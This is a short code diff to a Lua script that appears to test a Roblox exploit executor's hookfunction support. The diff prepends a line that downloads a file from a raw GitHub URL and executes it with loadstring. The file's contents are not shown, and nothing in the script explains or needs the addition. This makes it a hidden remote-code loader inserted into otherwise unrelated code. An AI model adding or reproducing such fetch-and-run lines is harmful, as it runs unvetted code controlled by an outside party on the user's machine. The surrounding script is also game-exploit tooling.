@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/123Lider321/Scripts-Backcup/refs/heads/main/credits"))()
 local replacesres="**Hook Results:** "
 if not pcall(hookfunction,warn,function()return "hook"end) then
     replacesres=replacesres..("😭 hook not present")
